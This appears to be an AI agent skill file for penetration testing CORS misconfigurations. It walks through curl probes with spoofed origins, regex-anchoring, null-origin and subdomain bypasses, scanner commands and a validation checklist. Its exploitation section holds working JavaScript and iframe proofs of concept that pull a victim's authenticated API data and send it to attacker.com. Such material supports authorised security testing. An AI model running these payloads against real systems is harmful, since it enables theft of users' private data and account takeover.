---
name: vuln-cors
description: "CORS misconfiguration testing skill. Tests origin reflection, null origin, subdomain trust chains, and credential-bearing cross-origin requests. Triggers: 'cors', 'cross origin', 'access-control-allow-origin', 'cors misconfiguration', 'cors bypass', 'cors exploit', 'origin reflection'."
---

# CORS Misconfiguration Testing

Exploitable CORS requires two factors: `Access-Control-Allow-Origin: <attacker>` **plus** `Access-Control-Allow-Credentials: true`. Both must be present.

## Phase 1: Identify CORS Policy

```bash
# Send custom Origin header — check if reflected
curl -s -I https://<target>/api/user \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=<token>" | grep -i "access-control"

# Check all auth-required endpoints
for path in /api/user /api/profile /api/account /api/me /api/settings /api/admin; do
  echo "=== $path ===" 
  curl -s -I "https://<target>$path" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=<session_token>" | grep -i "access-control"
done
```

Response patterns to look for:
- `Access-Control-Allow-Origin: https://evil.com` — reflected, likely vulnerable
- `Access-Control-Allow-Origin: *` — wildcard (exploitable only without credentials)
- `Access-Control-Allow-Credentials: true` — required for auth bypass

## Phase 2: Test Bypass Patterns

**Origin reflection (blind reflection):**
```bash
for origin in "https://attacker.com" "https://target.com.evil.com" "null"; do
  curl -s -I "https://<target>/api/me" \
    -H "Origin: $origin" -H "Cookie: session=<token>" | grep -i "access-control-allow-origin"
done
```

**Regex anchoring bypass:**
```bash
# Missing $ anchor: target.com.evil.com passes if regex is /target\.com/
curl -I "https://<target>/api/data" -H "Origin: https://evil.target.com" -H "Cookie: <session>"
curl -I "https://<target>/api/data" -H "Origin: https://target.com.evil.com" -H "Cookie: <session>"
# Missing ^ anchor: evilxtarget.com passes if regex is /target\.com$/
curl -I "https://<target>/api/data" -H "Origin: https://evilxtarget.com" -H "Cookie: <session>"
```

**Null origin (sandboxed iframe):**
```bash
curl -I "https://<target>/api/data" -H "Origin: null" -H "Cookie: <session>"
```

**Protocol downgrade:**
```bash
curl -I "https://<target>/api/data" -H "Origin: http://<target>" -H "Cookie: <session>"
```

**Subdomain trust chain (requires subdomain takeover):**
```bash
# If *.target.com trusted and subdomain is takeable
curl -I "https://<target>/api/data" -H "Origin: https://abandoned.target.com" -H "Cookie: <session>"
```

## Phase 3: Pre-flight Testing

```bash
# Test non-simple requests (PUT, DELETE, custom headers)
curl -X OPTIONS "https://<target>/api/user" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -H "Access-Control-Request-Headers: X-Custom-Header" \
  -H "Cookie: <session>" | grep -i "access-control"
```

## Phase 4: Automated Scanning

```bash
# Corsy
pip install corsy
python3 corsy.py -u https://<target>/api/ -H "Cookie: <session>"

# Nuclei CORS templates
nuclei -t exposures/cors/ -u https://<target> -H "Cookie: <session>"
nuclei -t misconfiguration/cors-* -u https://<target>

# CORStest
python3 corstest.py <target_urls.txt>
```

## Phase 5: Exploitation PoC

When `ACAO: attacker.com` + `ACAC: true` confirmed:

```javascript
// Host on attacker.com — victim visits page
fetch('https://<target>/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(d => new Image().src = 'https://attacker.com/log?data=' + btoa(JSON.stringify(d)));
```

For null origin via sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        srcdoc="<script>
  fetch('https://<target>/api/me', {credentials: 'include'})
    .then(r => r.text())
    .then(d => top.location = 'https://attacker.com/?data=' + btoa(d));
</script>"></iframe>
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: specific Origin header value → `ACAO` reflects it + `ACAC: true` present
2. **Reproducibility**: PoC JavaScript fetch executes and returns authenticated response data
3. **Impact**: data exfiltrated is user-specific (not public); demonstrate account takeover path or PII exposure

Note: `ACAO: *` without `ACAC: true` is LOW severity — can only read public endpoints. Document both headers explicitly.
